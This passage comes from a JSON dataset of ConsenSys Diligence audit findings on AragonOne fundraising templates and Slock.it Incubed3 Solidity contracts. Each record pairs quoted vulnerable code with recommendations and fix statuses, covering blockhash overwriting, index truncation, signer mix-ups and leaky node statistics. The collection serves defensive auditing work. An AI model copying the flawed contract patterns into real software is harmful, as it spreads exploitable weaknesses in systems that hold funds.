PRESALE\\_ID             = 0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5;\n\n```\n`bytes32 private constant PRESALE_ID = 0x5de9bbdeaf6584c220c7b7f1922383bcd8bbcd4b48832080afd9d5ebf9a04df5;`\n\n\n#### Recommendation\n\n\nCreate a new `apmNamehash` for `BalanceRedirectPresale`.",
      "summary": "\nThis bug report is about the aragonOne/Fundraising and aragonBlack/Fundraising templates referencing the same apmNamehash for two different contracts, `Presale` and `BalanceRedirectPresale`. This could lead to confusion as to which application is actually deployed and the `ENS` registry must be verified before using the contract to prevent malicious applications from being deployed. To solve this issue, a unique `apmNamehash` should be generated for `BalanceRedirectPresale`. This was fixed with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by generating a unique `apmNameHash` for `BalanceRedirectPresale` that does not collide with the one from `Presale`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13899",
      "title": "EOPBCTemplate - permission documentation inconsistencies âœ“Â Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed with [aragonone/[emailÂ protected]`bafe100`](https://github.com/aragonone/fundraising/pull/4/commits/bafe1005161d34b8e7113db355d059b78d432d00) by adding the undocumented and deviating permissions to the documentation.\n\n\n#### Description\n\n\n##### Undocumented\n\n\nThe template documentation provides an overview of the permissions set with the template. The following permissions are set by the template contract but are not documented in the accompanied `fundraising/templates/externally_owned_presale_bonding_curve/README.md`.\n\n\n**TokenManager**\n\n\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L220-L221**\n\n\n\n```\n\\_createPermissions(\\_acl, grantees, \\_fundraisingApps.bondedTokenManager, \\_fundraisingApps.bondedTokenManager.MINT\\_ROLE(), \\_owner);\n\\_acl.createPermission(\\_fundraisingApps.marketMaker, \\_fundraisingApps.bondedTokenManager, \\_fundraisingApps.bondedTokenManager.BURN\\_ROLE(), \\_owner);\n\n```\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/eopbc.yaml:L33-L44**\n\n\n\n```\n- app: anj-token-manager\n  role: MINT\\_ROLE\n  grantee: market-maker\n  manager: owner\n- app: anj-token-manager\n  role: MINT\\_ROLE\n  grantee: presale\n  manager: owner\n- app: anj-token-manager\n  role: BURN\\_ROLE\n  grantee: market-maker\n  manager: owner\n\n```\n##### Inconsistent\n\n\nThe following permissions are set by the template but are inconsistent to the outline in the documentation:\n\n\n**Controller**\n\n\n`owner` has the following permissions even though they are documented as not being set <https://github.com/ConsenSys/aragonone-presale-audit-2019-11/blob/9ddae8c7fde9dea3af3982b965a441239d81f370/code/fundraising/templates/externally_owned_presale_bonding_curve/README.md#controller>.\n\n\n\n```\n| App        | Permission                            | Grantee | Manager |\r\n| ---------- | ------------------------------------- | ------- | ------- |\r\n| Controller | UPDATE_BENEFICIARY                    | NULL    | NULL    |\r\n| Controller | UPDATE_FEES                           | NULL    | NULL    |\r\n| Controller | ADD_COLLATERAL_TOKEN                  | Owner   | Owner   |\r\n| Controller | REMOVE_COLLATERAL_TOKEN               | Owner   | Owner   |\r\n| Controller | UPDATE_COLLATERAL_TOKEN               | Owner   | Owner   |\r\n| Controller | UPDATE_MAXIMUM_TAP_RATE_INCREASE_PCT  | NULL    | NULL    |\r\n| Controller | UPDATE_MAXIMUM_TAP_FLOOR_DECREASE_PCT | NULL    | NULL    |\r\n| Controller | ADD_TOKEN_TAP                         | NULL    | NULL    |\r\n| Controller | UPDATE_TOKEN_TAP                      | NULL    | NULL    |\r\n| Controller | OPEN_PRESALE                          | Owner   | Owner   |\r\n| Controller | OPEN_TRADING                          | Presale | Owner   |\r\n| Controller | CONTRIBUTE                            | Any     | Owner   |\r\n| Controller | OPEN_BUY_ORDER                        | Any     | Owner   |\r\n| Controller | OPEN_SELL_ORDER                       | Any     | Owner   |\r\n| Controller | WITHDRAW                              | NULL    | NULL    |\r\n\n```\n**code/fundraising/templates/externally\\_owned\\_presale\\_bonding\\_curve/contracts/EOPBCTemplate.sol:L239-L240**\n\n\n\n```\n\\_acl.createPermission(\\_owner, \\_fundraisingApps.controller, \\_fundraisingApps.controller.UPDATE\\_BENEFICIARY\\_ROLE(), \\_owner);\n\\_acl.createPermission(\\_owner, \\_fundraisingApps.controller, \\_fundraisingApps.controller.UPDATE\\_FEES\\_ROLE(), \\_owner);\n\n```\n#### Recommendation\n\n\nFor transparency, all permissions set-up by the template must be documented.",
      "summary": "\nThis bug report is about the permissions set up by the template contract in the externally owned presale bonding curve (EOPBC) not being documented in the accompanying README.md. The template sets up two permissions that are not documented in the README.md: one in the TokenManager and one in the Controller. In the TokenManager, the owner is granted the MINT_ROLE and the marketMaker is granted the BURN_ROLE. In the Controller, the owner is granted the UPDATE_BENEFICIARY, UPDATE_FEES, ADD_COLLATERAL_TOKEN, REMOVE_COLLATERAL_TOKEN, UPDATE_COLLATERAL_TOKEN, UPDATE_MAXIMUM_TAP_RATE_INCREASE_PCT, UPDATE_MAXIMUM_TAP_FLOOR_DECREASE_PCT, ADD_TOKEN_TAP, UPDATE_TOKEN_TAP, OPEN_PRESALE, OPEN_TRADING, CONTRIBUTE, OPEN_BUY_ORDER, OPEN_SELL_ORDER, and WITHDRAW permissions.\n\nThe bug was fixed by adding the undocumented and deviating permissions to the documentation. For transparency, all permissions set-up by the template must be documented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "AragonOne â€” Aragon Network Presale",
      "source_link": "https://consensys.net/diligence/audits/2019/11/aragonone-aragon-network-presale/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Martin Ortner"
      ]
    },
    {
      "id": "13985",
      "title": "BlockhashRegistry - Existing blockhashes can be overwritten âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAddressed with [80bb6ecf](https://git.slock.it/in3/in3-contracts/commit/80bb6ecf19ec4cbc2de0367c4c5dc31661533689) and [17d450cf](https://git.slock.it/in3/in3-contracts/commit/17d450cfbb519259b8c811eacaf22ce8274457a0) by checking if blockhash exists and changing the `assert` to `require`.\n\n\n#### Description\n\n\nLast 256 blocks, that are available in the EVM environment, are stored in `BlockhashRegistry` by calling `snapshot()` or `saveBlockNumber(uint _blockNumber)` functions. Older blocks are recreated by calling `recreateBlockheaders`.\n\n\nThe methods will overwrite existing blockhashes.\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L79-L87**\n\n\n\n```\nfunction saveBlockNumber(uint \\_blockNumber) public {\n\n    bytes32 bHash = blockhash(\\_blockNumber);\n\n    require(bHash != 0x0, \"block not available\");\n\n    blockhashMapping[\\_blockNumber] = bHash;\n    emit LogBlockhashAdded(\\_blockNumber, bHash);\n}\n\n```\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L72**\n\n\n\n```\nblockhashMapping[bnr] = calculatedHash;\n\n```\n#### Recommendation\n\n\nIf a block is already saved in the smart contract, it can be checked and a SSTORE can be prevented to save gas. Require that blocknumber hash is not stored.\n\n\n\n```\nrequire(blockhashMapping[\\_blockNumber] == 0x0, \"block already saved\");\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13984",
      "title": "BlockhashRegistry - recreateBlockheaders() should use the evm provided blockhash when applicable Â Pending",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe provided code-change at [79fa3ef1](https://git.slock.it/in3/in3-contracts/commit/12280e42ce2133e1effaef2b10986ecd93d30bf8) is not addressing the raised concerns. As noted in the recommendation it is suggested to completely skip the recreation routine if the target blockhash (`_blockNumber.sub(_blockheaders.length)`) is available to the evm. The method should call `saveBlockNumber(_blockNumber)` instead.\n\n\nThe commit attempts to add a verification for extracted blockhashes from the user provided RLP data if the blockhash for the block is available. However, the variable name `currentBlock` is misleading making it hard to follow the authors intent.\n\n\n\n\n#### Description\n\n\nThere are different levels of trust attached to blockhashes stored in the BlockhashRegistry. On one side there are blockhashes which data-source is the evm ( `blockhash(blocknumber)`) and on the other side there are blockhashes that have been fed into the system by recalculating block-headers and establishing a trust chain to an already existing blockhash in the contract. While the contract can trust the result of `blockhash(blocknumber)` for the most recent 256 blocks because the information is coming directly from the evm, blockhashes that are re-created by calling `recreateBlockheaders` are manually verified and trust relies on the proper validation of the chain of block-headers provided.\n\n\nSide-effect: Also saves gas by avoiding unnecessary calculations within the `recreateBlockheaders()` codepath as blockhash is already available via evm.\n\n\n#### Recommendation\n\n\n`recreateBlockheaders()` should prefer to use `blockhash(number)` by calling `saveBlockNumber()` instead of re-calculating the blockhash from the user provided chain of blockheaders, if the blockhash can easily be accessed by the evm (most recent 256 blocks, except current block). Check if `_blockheaders.length > 0 && _blockNumber.sub(_blockheaders.length) < block.number-256`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13983",
      "title": "Experimental Compiler features are enabled - ABIEncoderV2 Â Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis issue has been addressed with the following statement:\n\n\n\n> \n> In order to pass structs between contracts we need that new ABIEncoder. [..] The old NodeRegistry did not require the `ABIEncoderV2`. [..] But due to the separation of the contracts in Logic and Data we are passing certain data-structures between contracts.\n> \n> \n> \n\n\n\n\n#### Description\n\n\nThe smart contracts enable experimental compiler features. Please note that these features are experimental for a reason and should be avoided unless explicitly required.\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L21-L21**\n\n\n\n```\npragma experimental ABIEncoderV2;\n\n```\nSeems that `NodeRegistry` does not require any `ABIEncoderV2` specific functionality.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L21-L21**\n\n\n\n```\npragma experimental ABIEncoderV2;\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13982",
      "title": "BlockhashRegistry- assembly code can be optimized âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed as per recommendation with <https://git.slock.it/in3/in3-contracts/commit/87f02a7c4f5c30d2b4be42f331c1306e85d42ca6>.\n\n\n#### Description\n\n\nThe following code can be optimized by removing `mload` and `mstore`:\n\n\n**code/in3-contracts/contracts/BlockhashRegistry.sol:L106-L125**\n\n\n\n```\nrequire(first > 0xf7, \"invalid offset\");\nuint8 offset = first - 0xf7 + 2;\n\n/// we are using assembly because it's the most efficent way to access the parent blockhash within the rlp-encoded blockheader\n// solium-disable-next-line security/no-inline-assembly\nassembly { // solhint-disable-line no-inline-assembly\n    // mstore to get the memory pointer of the blockheader to 0x20\n    mstore(0x20, \\_blockheader)\n\n    // we load the pointer we just stored\n    // then we add 0x20 (32 bytes) to get to the start of the blockheader\n    // then we add the offset we calculated\n    // and load it to the parentHash variable\n    parentHash :=mload(\n        add(\n            add(\n                mload(0x20), 0x20\n            ), offset)\n    )\n}\n\n```\n#### Recommendation\n\n\n\n```\nassembly { // solhint-disable-line no-inline-assembly\n            // mstore to get the memory pointer of the blockheader to 0x20\n            //mstore(0x20, \\_blockheader) //@audit should assign 0x20ptr to variable first and use it.\n\n            // we load the pointer we just stored\n            // then we add 0x20 (32 bytes) to get to the start of the blockheader\n            // then we add the offset we calculated\n            // and load it to the parentHash variable\n            parentHash :=mload(\n                add(\n                    add(\n                        \\_blockheader, 0x20\n                    ), offset)\n            )\n        }\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13981",
      "title": "Registries - general inconsistencies Â Pending",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe breakdown of the fixes are as follows:\n\n\n\n> \n> * NodeRegistry - check for addr(0) being passed. This is anyway only done in the constructor and will not require a lot of gas.\n> \n> \n> \n\n\nThe proper checks for registry addresses are added in [4786a966](https://git.slock.it/in3/in3-contracts/commit/bb01c22ea43064d9d8133bd8cb38e96e49fdc796).\n\n\n\n> \n> * NodeRregistry - unnecessary payable\n> \n> \n> \n\n\nRemoved payable modifier everywhere, as ERC20 support is added to the system. ERC20 support is not part of this audit.\n\n\n\n> \n> * NodeRegistry - deposit checks can be combined into one function to make the code more readable. The min deposit amount could be exposed as public const to allow other entities to query the contracts minimum deposit similar to the max ether amount. `MAX_ETHER_LIMIT` should make clear that this limit is only applicable in the first year (e.g. `MAX_ETHER_LIMIT_FIRST_YEAR`) .\n> \n> \n> \n\n\nFixed and variables renamed.\n\n\n\n> \n> * NodeRegistry - `require(si.owner == msg.sender)` can be checked before accessing the `nodes` array\n> \n> \n> \n\n\nAdded proper checks in [c9e75b35](https://git.slock.it/in3/in3-contracts/commit/f1fd7943d75a3a46339afaa8cce1f72a2fa0d352).\n\n\n\n> \n> * NodeRegistry - removeNode resets index to a valid node array index of 0. Even though the code will access the index it is good practice to set this to an invalid value to make sure it raises an error condition if it is wrongly accessed in a future revision of the code. This is mainly a safeguard. Another option is to invalidate the 0 index.\n> \n> \n> \n\n\nAlthough the index is not set to 0, this issue is not yet fixed (Follow up [here](https://git.slock.it/in3/in3-contracts/issues/16#note_17907)).\n\n\n\n> \n> * NodeRegistry - implicitly set defaults are hard to maintain. This should be a constant state variable that can be queried to be transparent about minimum and maximum values. Prefer throwing an exception instead of automatically setting the value to a minimum as this might be unexpected by a client and can cover error conditions.\n> \n> \n> \n\n\n`timeout` has been removed, so this is obsolete as it is not in the new code anymore.\n\n\n\n> \n> * NodeRegistry - one year startup period: instead of storing the deployment timestamp the contract should store the end-of-admin-timestamp.\n> \n> \n> \n\n\nFixed as recommended `timestampAdminKeyActive = block.timestamp + YEAR_DEFINITION;`\n\n\n\n> \n> * NodeRegistry - inefficient re-calculation of hash\n> \n> \n> \n\n\nFixed ([issues/16](https://git.slock.it/in3/in3-contracts/issues/16)).\n\n\n\n> \n> * NodeRegistry - weight should be part of proofHash\n> \n> \n> \n\n\nAdded in [9fa5548d](https://git.slock.it/in3/in3-contracts/commit/9fa5548d586f76f1bfee83cb8d1fc73665de3058).\n\n\n\n> \n> * NodeRegistry - updateNode if the new timeout is smaller than the current timeout it will silently be ignored. This may be unexpected by the caller and cover error conditions where a client provides wrong inputs. Raising an exception should be preferred in such cases instead of gracefully assuming values.\n> \n> \n> \n\n\nFixed by removing timeout variable ([issues/16](https://git.slock.it/in3/in3-contracts/issues/16)).\n\n\n\n> \n> * NodeRegistry - admin functionality should be clearly named as such for transparency reasons (e.g. `adminRemovenodeFromRegistry`) .\n> \n> \n> \n\n\nRenamed all admin function in both contracts with prefix `admin`.\n\n\n\n\n#### Description\n\n\n* NodeRegistry - check for addr(0) being passed. This is anyway only done in the constructor and will not require a lot of gas.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L138-L139**\n\n\n\n```\nconstructor(BlockhashRegistry \\_blockRegistry) public {\n    blockRegistry = \\_blockRegistry;\n\n```\n* NodeRregistry - unnecessary payable\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L535-L535**\n\n\n\n```\naddress payable \\_owner,\n\n```\n* NodeRegistry - deposit checks can be combined into one function to make the code more readable. The min deposit amount could be exposed as public const to allow other entities to query the contracts minimum deposit similar to the max ether amount. `MAX_ETHER_LIMIT` should make clear that this limit is only applicable in the first year (e.g. `MAX_ETHER_LIMIT_FIRST_YEAR`) .\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L543-L545**\n\n\n\n```\nrequire(\\_deposit >= 10 finney, \"not enough deposit\");\n\ncheckNodeProperties(\\_deposit, \\_timeout);\n\n```\n**code/in3-contracts/contracts/NodeRegistry.sol:L120-L120**\n\n\n\n```\nuint constant internal MAX\\_ETHER\\_LIMIT = 50 ether;\n\n```\n* NodeRegistry - `require(si.owner == msg.sender)` can be checked before accessing the `nodes` array\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L402-L404**\n\n\n\n```\nSignerInformation storage si = signerIndex[\\_signer];\nIn3Node memory n = nodes[si.index];\nrequire(si.owner == msg.sender, \"only for the in3-node owner\");\n\n```\n* NodeRegistry - removeNode resets index to a valid node array index of 0. Even though the code will access the index it is good practice to set this to an invalid value to make sure it raises an error condition if it is wrongly accessed in a future revision of the code. This is mainly a safeguard. Another option is to invalidate the 0 index.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L612-L612**\n\n\n\n```\nsignerIndex[nodes[\\_nodeIndex].signer].index = 0;\n\n```\n* NodeRegistry - implicitly set defaults are hard to maintain. This should be a constant state variable that can be queried to be transparent about minimum and maximum values. Prefer throwing an exception instead of automatically setting the value to a minimum as this might be unexpected by a client and can cover error conditions.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L565-L565**\n\n\n\n```\nm.timeout = \\_timeout > 1 hours ? \\_timeout : 1 hours;\n\n```\n* NodeRegistry - one year startup period: instead of storing the deployment timestamp the contract should store the end-of-admin-timestamp.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L256-L256**\n\n\n\n```\nrequire(block.timestamp < (blockTimeStampDeployment + YEAR\\_DEFINITION), \"only in 1st year\");// solhint-disable-line not-rely-on-time\n\n```\n* NodeRegistry - inefficient re-calculation of hash\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L438-L441**\n\n\n\n```\nif (newURl != keccak256(bytes(node.url))) {\n\n    // deleting the old entry\n    delete urlIndex[keccak256(bytes(node.url))];\n\n```\n* NodeRegistry - weight should be part of proofHash\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L490-L502**\n\n\n\n```\nfunction calcProofHash(In3Node memory \\_node) internal pure returns (bytes32) {\n\n    return keccak256(\n        abi.encodePacked(\n            \\_node.deposit,\n            \\_node.timeout,\n            \\_node.registerTime,\n            \\_node.props,\n            \\_node.signer,\n            \\_node.url\n        )\n    );\n}\n\n```\n* NodeRegistry - updateNode if the new timeout is smaller than the current timeout it will silently be ignored. This may be unexpected by the caller and cover error conditions where a client provides wrong inputs. Raising an exception should be preferred in such cases instead of gracefully assuming values.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L463-L465**\n\n\n\n```\nif (\\_timeout > node.timeout) {\n    node.timeout = \\_timeout;\n}\n\n```\n* NodeRegistry - admin functionality should be clearly named as such for transparency reasons (e.g. `adminRemovenodeFromRegistry`) .",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13980",
      "title": "NodeRegistry - removeNode unnecessarily casts the nodeIndex to uint64 potentially truncating its value âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed as per recommendation <https://git.slock.it/in3/in3-contracts/commit/6c35dd422e27eec1b1d2f70e328268014cadb515>.\n\n\n#### Description\n\n\n`removeNode` removes a node from the Nodes array. This is done by copying the last node of the array to the `_nodeIndex` of the node that is to be removed. Finally the node array size is decreased.\n\n\nA Nodeâ€™s index is also referenced in the `SignerInformation` struct. This index needs to be adjusted when removing a node from the array as the last node is copied to the index of the node that is to be removed.\n\n\nWhen adjusting the Nodeâ€™s index in the `SignerInformation` struct `removeNode` casts the index to `uint64`. This is both unnecessary as the struct defines the index as `uint` and theoretically dangerous if a node at an index greater than `uint64_max` is removed. The resulting `SignerInformation` index will be truncated to `uint64` leading to an inconsistency in the contract.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L60-L69**\n\n\n\n```\nstruct SignerInformation {\n    uint64 lockedTime;                  /// timestamp until the deposit of an in3-node can not be withdrawn after the node was removed\n    address owner;                      /// the owner of the node\n\n    Stages stage;                       /// state of the address\n\n    uint depositAmount;                 /// amount of deposit to be locked, used only after a node had been removed\n\n    uint index;                         /// current index-position of the node in the node-array\n}\n\n```\n**code/in3-contracts/contracts/NodeRegistry.sol:L614-L620**\n\n\n\n```\n// move the last entry to the removed one.\nIn3Node memory m = nodes[length - 1];\nnodes[\\_nodeIndex] = m;\n\nSignerInformation storage si = signerIndex[m.signer];\nsi.index = uint64(\\_nodeIndex);\nnodes.length--;\n\n```\n#### Recommendation\n\n\nDo not cast and therefore truncate the index.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13979",
      "title": "in3-server - in3_stats leaks information Â Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThere is a config-option `-profile.noStats` to deactivate stats, which defaults to `True` in the current release.\n\n\n#### Description\n\n\n`in3_stat` shows information from node activities in the currentMonth, currentDay, currentHour which can result in leaking information about the functionality that node is being used for. This information might be valuable when an attacker wants to find out how utilized a node is and if any reflection attacks are successful (<https://github.com/ConsenSys/slockit-in3-audit-2019-09/issues/50)>.\n\n\n#### Examples\n\n\n\n```\n{\n    'profile': AttributeDict({\n        'name': 'Slockit2',\n        'icon': 'https://slock.it/assets/slock\\_logo.png',\n        'url': 'https://slock.it'\n    }),\n    'stats': Attr\n    ibuteDict({\n        'upSince': 1568400626355,\n        'currentMonth': AttributeDict({\n            'requests': 47618,\n            'lastRequest': 1569422025347,\n            'methods': AttributeDict({\n                'nd-2': 2,\n                'eth\\_call': 940,\n                'eth\\_blockNumber': 25,\n                'eth\\_getBlockByNumber': 45395,\n                'web3\\_clientVersion': 386,\n                'admin\\_datadir': 7,\n                'admin\\_peers': 11,\n                'shh\\_version': 7,\n                'shh\\_info': 14,\n                'admin\\_nodeInfo ': 9, '\n txpool\\_status ': 9, '\n personal\\_listAccounts ': 3, '\n eth\\_chainId ': 12, '\n eth\\_protocolVersion ': 6, '\n net\\_listening ': 6, '\n net\\_peerCount ': 6, '\n eth\\_syncing ': 6,\n                'eth\\_mining': 6,\n                'eth\\_hashrate': 6,\n                'eth\\_gasPrice': 18,\n                'eth\\_coinbase': 44,\n                'eth\\_accounts': 54,\n                'eth\\_getBalance': 321,\n                'personal\\_unlockAccount': 61,\n                'personal\\_\n importRawKey ': 5, '\n personal\\_newAccount ': 8, '\n eth\\_estimateGas ': 16, '\n eth\\_sendRawTransaction ': 9, '\n eth\\_getTransactionReceipt ': 49, '\n in3\\_sign ': 59, '\n eth\\_getCode ': 33,\n                'eth\\_getTransactionCount': 15,\n                'eth\\_getLogs': 8,\n                'in3\\_stats': 16,\n                'in3\\_validatorlist': 15,\n                'in3\\_nodeList': 15,\n                'in3\\_call': 15,\n                'proof\\_in3\\_sign': 1\n            })\n        }),\n        'currentDay': AttributeDict({\n            'requests': 144,\n            'lastRequest': 1569422025347,\n            'methods': AttributeDict({\n                'eth\\_getBlockByNumber': 135,\n                'web3\\_clientVersion': 6,\n                'eth\\_coinbase': 1,\n                'eth\\_accounts': 1,\n                'in3\\_stats': 1\n            })\n        }),\n        'currentHour': AttributeDict({\n            'requests': 144,\n            'lastRequest': 1569422025346,\n            'methods': AttributeDict({\n                'eth\\_getBlockByNumber': 135,\n                'web3\\_clientVersion': 6,\n                'eth\\_coinbase': 1,\n                'eth\\_accounts': 1,\n                'in3\\_stats': 1\n            })\n        })\n    })\n}\n\n```\n#### Recommendation\n\n\nMake sure if this information is needed, if not enable it just for debugging purposes.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13978",
      "title": "NodeRegistry - returnDeposit and transferOwnership should emit an event âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed in [f1fd7943](https://git.slock.it/in3/in3-contracts/commit/f1fd7943d75a3a46339afaa8cce1f72a2fa0d352) by adding new events (`LogDepositReturned`, `LogNodeRemoved`, `LogNodeConvicted`, `LogOwnershipChanged`, `LogNodeUpdated`, `LogNodeRegistered`)\n\n\n#### Description\n\n\nImportant state changing functions should emit an event for the purpose of having an audit trail and being able to monitor the smart contract usage and performance.\n\n\n#### Recommendation\n\n\nEmit events for `returnDeposit` and `transferOwnership`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13977",
      "title": "NodeRegistry - In3Node memory n is never used âœ“Â Fixed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nFixed by removing the modifier and move the node-signer check to functions in [f1fd7943](https://git.slock.it/in3/in3-contracts/commit/f1fd7943d75a3a46339afaa8cce1f72a2fa0d352)\n\n\n#### Description\n\n\nNodeRegistry `In3Node memory n` is never used inside the modifier `onlyActiveState`.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L125-L133**\n\n\n\n```\nmodifier onlyActiveState(address \\_signer) {\n\n    SignerInformation memory si = signerIndex[\\_signer];\n    require(si.stage == Stages.Active, \"address is not an in3-signer\");\n\n    In3Node memory n = nodes[si.index];\n    assert(nodes[si.index].signer == \\_signer);\n    \\_;\n}\n\n```\n#### Recommendation\n\n\nUse `n` in the assertion to access the node signer `assert(n.signer == _signer);`  or directly access it from storage and avoid copying the struct.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Slock.it Incubed3",
      "source_link": "https://consensys.net/diligence/audits/2019/09/slock.it-incubed3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13976",
      "title": "NodeRegistry.updateNode replaces signer with owner and emits inconsistent events âœ“Â Fixed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nReviewed merged changes at [in3-contracts/5cb54165](https://git.slock.it/in3/in3-contracts/blob/5cb541655fad86896cdf37049a3291cf20d97d3a/contracts/NodeRegistryData.sol).\n\n\n* The method now emits a distinct event *twice* when node properties are updated.\n* The event correctly emits the signer.\n* When updating a node URL, the new URLInformation now correctly sets the signer.\n\n\nHowever, there is a discrepancy between the process of registering a node and updating nodeâ€™s properties. When registering a node the owner has to provide a signed message containing the registration properties from the signer. Once the node is registered it can be unilaterally updated by the owner without requiring the signers permission to do so. According to slock.it it is assumed that the node owner and the signer are in control of the same entity and therefore this is not a concern.\n\n\n\n\n#### Description\n\n\nWhen the `owner` calls `updateNode()` function providing a new `url` for the node, the `signer` of the url is replaced by `msg.sender` which in this case is the owner of the node. Note that new URL can resolve to the same URL as before (See <https://github.com/ConsenSys/slockit-in3-audit-2019-09/issues/36)>.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L438-L452**\n\n\n\n```\nif (newURl != keccak256(bytes(node.url))) {\n\n    // deleting the old entry\n    delete urlIndex[keccak256(bytes(node.url))];\n\n    // make sure the new url is not already in use\n    require(!urlIndex[newURl].used, \"url is already in use\");\n\n    UrlInformation memory ui;\n    ui.used = true;\n    ui.signer = msg.sender;\n    urlIndex[newURl] = ui;\n    node.url = \\_url;\n}\n\n\n```\nFurthermore, the method emits a `LogNodeRegistered` event when the node structure is updated. However, the event will always emit `msg.sender` as the signer even though that might not be true. For example, if the `url` does not change, the signer can still be another account that was previously registered with `registerNodeFor` and is not necessarily the `owner`.\n\n\n**code/in3-contracts/contracts/NodeRegistry.sol:L473-L478**\n\n\n\n```\nemit LogNodeRegistered(\n    node.url,\n    \\_props,\n    msg.sender,\n    node.deposit\n);\n\n```\n**code/in3-contracts/contracts/NodeRegistry.sol:L30-L30**\n\n\n\n```\nevent LogNodeRegistered(string url, uint props, address signer, uint deposit);\n\n```\n#### Recommendation\n\n\n* The `updateNode()` function gets the signer as an input used to reference the node structure and this `signer` should be set for the `UrlInformation`.\n\n\n\n```\nfunction updateNode(\n        address 